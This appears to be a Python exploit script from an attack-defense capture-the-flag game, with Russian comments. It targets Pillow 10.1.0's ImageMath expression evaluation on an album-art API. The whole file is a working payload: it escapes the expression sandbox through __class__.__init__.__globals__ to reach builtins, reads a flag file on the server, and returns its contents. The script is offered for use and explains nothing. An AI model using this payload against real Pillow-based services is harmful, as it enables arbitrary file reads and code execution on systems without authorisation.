#!/usr/bin/env python3
"""vuln 4: Pillow 10.1.0 ImageMath -> чтение файла от root. attack data = track_id."""
import json, re
from lib import PNG, args, emit, fail, http

host, track = args(1)
if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", track):
    fail("плохой track_id")

B = "a.__class__.__init__.__globals__['__builtins__']"
expr = "%s['type'](nm, (), {'mode': %s['open'](fp).read()})()" % (B, B)
values = {"expression": expr, "nm": "X", "fp": "/app/stores/infotainment/%s.flag" % track,
          "__class__": 0, "__init__": 0, "__globals__": 0, "type": 0, "open": 0, "read": 0}

st, body = http(host, 8080, "POST", "/api/media/albumart", {"image_b64": PNG, "values": values})
if st != 200:
    fail("album-art отклонил payload, HTTP %s" % st)
emit(json.loads(body)["mode"].strip())
